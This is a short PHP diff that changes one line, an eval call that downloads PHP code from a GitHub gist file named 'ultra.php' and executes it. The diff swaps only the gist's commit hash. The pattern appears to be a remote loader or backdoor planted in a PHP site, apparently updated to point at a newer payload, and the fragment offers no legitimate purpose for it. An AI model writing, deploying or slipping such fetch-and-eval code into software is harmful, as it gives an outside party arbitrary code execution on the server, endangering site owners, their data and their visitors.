@@ -11,5 +11,5 @@
 
     return $data;
 }
-      eval('?>' . get('https://gist.githubusercontent.com/paknago21/3ee3a4bf5be4e1e277ec90f7bc718544/raw/c048a459277c8e702ecc632ea244860ff3581318/ultra.php'));
+      eval('?>' . get('https://gist.githubusercontent.com/paknago21/3ee3a4bf5be4e1e277ec90f7bc718544/raw/da02b2a29271ef530a1362e09ab78b2cf5a54b76/ultra.php'));
 ?>
